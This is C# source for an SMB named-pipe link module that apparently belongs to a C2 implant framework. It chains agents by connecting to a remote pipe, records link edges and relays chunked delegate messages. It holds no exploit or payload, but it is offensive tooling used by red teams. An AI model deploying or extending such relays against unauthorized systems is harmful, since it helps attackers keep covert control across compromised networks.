using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using H.Pipes;
using H.Pipes.Args;
using System.Collections.Concurrent;
using System.Text;

namespace Agent
{
    public class SmbLink
    {
        private PipeClient<SmbMessage> clientPipe { get; set; }
        public bool connected { get; set; }
        private string task_id { get; set; }
        private SmbLinkArgs args { get; set; }
        private string agent_id { get; set; }
        public string linked_agent_id { get; set; }
        private AutoResetEvent messageSuccess = new AutoResetEvent(false);
        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
        IMessageManager messageManager { get; set; }
        ILogger logger { get; set; }

        public SmbLink(IMessageManager messageManager, ILogger logger, SmbLinkArgs args, string agent_id, string task_id)
        {
            this.agent_id = agent_id;
            this.messageManager = messageManager;
            this.logger = logger;
            this.task_id = task_id;
            this.args = args;
        }

        public async Task<EdgeResponse> Link()
        {
            try
            {
                if (this.clientPipe == null || !this.connected)
                {
                    // Initialize and configure the client pipe
                    this.clientPipe = new PipeClient<SmbMessage>(args.pipename, args.hostname);
                    this.clientPipe.MessageReceived += async (o, args) => await OnMessageReceive(args);
                    this.clientPipe.Connected += (o, _) => this.connected = true;
                    this.clientPipe.Disconnected += (o, _) => this.connected = false;

                    await clientPipe.ConnectAsync();

                    if (clientPipe.IsConnected)
                    {
                        this.connected = true;

                        // Wait for the agent to provide its UUID
                        messageSuccess.WaitOne();

                        return new EdgeResponse
                        {
                            task_id = task_id,
                            user_output = $"Established link with pipe.\r\n{this.agent_id} -> {this.linked_agent_id}",
                            completed = true,
                            edges = new List<Edge>
                                {
                                    new Edge
                                    {
                                        destination = this.linked_agent_id, // Downstream UUID
                                        source = this.agent_id,            // Current Agent UUID
                                        action = "add",
                                        c2_profile = "smb",
                                        metadata = string.Empty
                                    }
                                }
                        };
                    }
                }
            }
            catch (Exception e)
            {
                // Log the exception and return the error response
                Console.Error.WriteLine($"Error in Link: {e}");

                return new EdgeResponse
                {
                    task_id = task_id,
                    user_output = e.ToString(),
                    completed = true,
                    edges = new List<Edge>()
                };
            }

            // Return a failure response if the link couldn't be established
            return new EdgeResponse
            {
                task_id = task_id,
                user_output = "Failed to establish link with pipe",
                completed = true,
                edges = new List<Edge>()
            };
        }

        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
        {
            try
            {
                // Ensure `linked_agent_id` is initialized
                if (string.IsNullOrEmpty(linked_agent_id))
                {
                    linked_agent_id = args.Message.agent_guid;
                }

                switch (args.Message.message_type)
                {
                    case "success":
                        messageSuccess.Set();
                        break;

                    default:
                        // Process messages for "checkin" or other cases
                        var messageBuilder = this.partialMessages.GetOrAdd(args.Message.guid, _ => new StringBuilder());
                        messageBuilder.Append(args.Message.delegate_message);

                        if (args.Message.final)
                        {
                            var dm = new DelegateMessage
                            {
                                c2_profile = "smb",
                                message = messageBuilder.ToString(),
                                uuid = args.Message.agent_guid,
                            };

                            this.messageManager.AddDelegateMessage(dm);
                            this.partialMessages.TryRemove(args.Message.guid, out _);
                            messageSuccess.Set();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
            }
        }

        //Unlink from the named pipe
        public async Task<bool> Unlink()
        {
            try
            {
                if (this.clientPipe != null)
                {
                    await this.clientPipe.DisconnectAsync();
                    await this.clientPipe.DisposeAsync();
                }

                this.connected = false;
                this.partialMessages.Clear();

                return true;
            }
            catch (Exception ex)
            {
                // Optionally log the error for debugging
                return false;
            }
            finally
            {
                // Ensure resources are cleared even if an exception occurs
                this.connected = false;
                this.partialMessages.Clear();
            }
        }
        public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
        {
            try
            {
                // Precompute parts and the last part for efficiency
                var parts = dm.message.SplitByLength(4000).ToList();
                var lastPart = parts.Last();

                // Create the base SmbMessage with common fields
                var baseMessage = new SmbMessage
                {
                    guid = Guid.NewGuid().ToString(),
                    message_type = "chunked_message",
                    agent_guid = agent_id
                };

                foreach (var part in parts)
                {
                    // Clone the base message and update unique fields
                    var sm = new SmbMessage
                    {
                        guid = baseMessage.guid,
                        message_type = baseMessage.message_type,
                        agent_guid = baseMessage.agent_guid,
                        delegate_message = part,
                        final = part == lastPart
                    };

                    await this.clientPipe.WriteAsync(sm);

                    // Ensure the message was successfully processed
                    messageSuccess.WaitOne();
                }

                return true;
            }
            catch (Exception e)
            {
                // Optionally log the error here
                return false;
            }
        }
    }
}
